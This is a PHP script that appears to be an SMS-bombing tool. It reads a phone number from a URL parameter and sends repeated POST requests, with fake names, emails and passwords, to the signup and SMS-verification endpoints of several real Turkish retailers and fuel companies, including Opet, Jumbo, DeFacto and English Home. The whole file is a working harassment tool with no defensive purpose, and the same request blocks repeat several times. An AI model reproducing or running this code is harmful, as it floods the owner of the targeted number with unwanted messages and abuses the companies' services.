 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://ipapp.ipragaz.com.tr/login/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"name=ahmet kaya&phone=$telno&day=18&month=1&year=1980&carPlate=24     LSF     2022&savePersonalData=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://ipapp.ipragaz.com.tr/login/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"name=ahmet kaya&phone=$telno&day=18&month=1&year=1980&carPlate=24     LSF     2022&savePersonalData=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
}
 
?>